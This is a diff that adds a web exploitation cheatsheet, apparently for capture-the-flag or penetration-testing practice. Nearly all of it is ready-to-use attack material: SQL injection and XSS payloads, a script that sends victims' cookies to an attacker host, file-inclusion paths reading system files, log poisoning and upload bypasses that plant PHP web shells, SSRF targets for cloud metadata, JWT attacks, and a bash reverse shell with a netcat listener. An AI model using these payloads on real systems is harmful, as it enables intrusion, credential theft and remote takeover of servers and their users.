@@ -1,1 +1,233 @@
+# Web Exploitation Cheatsheet
 
+---
+
+## Recon Order (always do this first)
+
+```bash
+# 1. Full page source — look for comments, hidden forms, JS includes
+Ctrl+U (browser) or curl -s http://IP | less
+
+# 2. Robots.txt and sitemap
+curl http://IP/robots.txt
+curl http://IP/sitemap.xml
+
+# 3. Tech fingerprint
+whatweb http://IP
+curl -I http://IP     # response headers — server, X-Powered-By, cookies
+
+# 4. Directory brute force
+gobuster dir -u http://IP -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak
+ffuf -u http://IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+
+# 5. Subdomain enum (if domain-based)
+ffuf -u http://IP -H "Host: FUZZ.domain.com" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <default_size>
+```
+
+---
+
+## SQL Injection
+
+### Manual Test Payloads
+```
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' /*
+admin'--
+' OR 1=1--
+" OR "1"="1
+```
+
+### sqlmap
+```bash
+# Basic
+sqlmap -u "http://IP/page?id=1" --dbs
+
+# From Burp request file
+sqlmap -r request.txt --dbs --batch
+
+# Dump specific db
+sqlmap -u "http://IP/page?id=1" -D dbname --tables
+sqlmap -u "http://IP/page?id=1" -D dbname -T users --dump
+
+# OS shell attempt
+sqlmap -u "http://IP/page?id=1" --os-shell
+```
+
+---
+
+## XSS
+
+### Basic Test Payloads
+```javascript
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+"><script>alert(1)</script>
+'><img src=x onerror=alert(1)>
+javascript:alert(1)
+<svg onload=alert(1)>
+```
+
+### Cookie Stealing (Stored XSS)
+```javascript
+<script>document.location='http://YOUR_IP:8000/steal?c='+document.cookie</script>
+
+// Catch with:
+python3 -m http.server 8000
+```
+
+---
+
+## File Inclusion (LFI/RFI)
+
+### LFI Test
+```
+?file=../../../../etc/passwd
+?file=....//....//....//etc/passwd
+?file=php://filter/convert.base64-encode/resource=index.php
+?file=/proc/self/environ
+```
+
+### Log Poisoning via LFI
+```bash
+# Poison User-Agent in access log
+curl -A "<?php system(\$_GET['cmd']); ?>" http://IP/
+# Then include log + execute
+?file=../../../../var/log/apache2/access.log&cmd=id
+```
+
+### RFI
+```
+?file=http://YOUR_IP/shell.php
+```
+
+---
+
+## Command Injection
+
+### Test Payloads
+```
+; id
+| id
+&& id
+` id `
+$(id)
+%0a id          # URL-encoded newline
+```
+
+### Bypass Filters
+```bash
+# Space bypass
+cat${IFS}/etc/passwd
+cat</etc/passwd
+
+# String concatenation
+c'at' /etc/passwd
+/bin/ca$'\x74' /etc/passwd
+
+# Semicolon blocked — try pipes
+ls|cat /etc/passwd
+```
+
+---
+
+## IDOR (Insecure Direct Object Reference)
+
+```
+# Change IDs in URLs
+/profile?id=1  →  /profile?id=2
+
+# Change IDs in POST bodies (use Burp Repeater)
+{"user_id": 1}  →  {"user_id": 2}
+
+# Check for GUIDs — sometimes predictable or leakable
+# Try encoded values: base64, hex decode the ID first
+```
+
+---
+
+## SSRF
+
+```
+http://127.0.0.1/admin
+http://localhost/admin
+http://169.254.169.254/latest/meta-data/    # AWS metadata
+http://metadata.google.internal/            # GCP metadata
+http://192.168.x.x/internal-resource
+file:///etc/passwd
+```
+
+---
+
+## JWT Attacks
+
+```bash
+# Decode without verification (jwt.io or manually)
+echo "PAYLOAD_BASE64" | base64 -d
+
+# Algorithm confusion: change "alg": "RS256" → "HS256" and sign with public key
+
+# None algorithm attack
+# Set "alg": "none", remove signature
+
+# Brute-force weak HMAC secret
+jwt_tool TOKEN -C -d /usr/share/wordlists/rockyou.txt
+```
+
+---
+
+## File Upload Bypass
+
+```
+# Extension bypass
+shell.php.jpg
+shell.pHp
+shell.php5
+shell.phtml
+shell.phar
+
+# MIME type bypass — change Content-Type in Burp
+Content-Type: image/jpeg  (but upload PHP file)
+
+# Magic bytes — prepend GIF header
+GIF89a; <?php system($_GET['cmd']); ?>
+
+# Double extension
+shell.jpg.php
+```
+
+---
+
+## Useful Headers to Test Manually
+
+```
+X-Forwarded-For: 127.0.0.1
+X-Real-IP: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+Client-IP: 127.0.0.1
+Referer: http://localhost/admin
+Host: internal.target.com
+```
+
+---
+
+## Burp Suite Quick Keys
+
+| Action | Shortcut |
+|---|---|
+| Send to Repeater | Ctrl+R |
+| Send to Intruder | Ctrl+I |
+| Forward request | Ctrl+F |
+| URL encode selection | Ctrl+Shift+U |
+| URL decode selection | Ctrl+Shift+U (toggle) |
+
+---
+
+## Reverse Shells for Web
+
+```php
+<?php system($_GET['cmd']); ?>                        // Param shell
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'"); ?>  // Auto-connect
+```
+
+Start listener first: `nc -lvnp PORT`
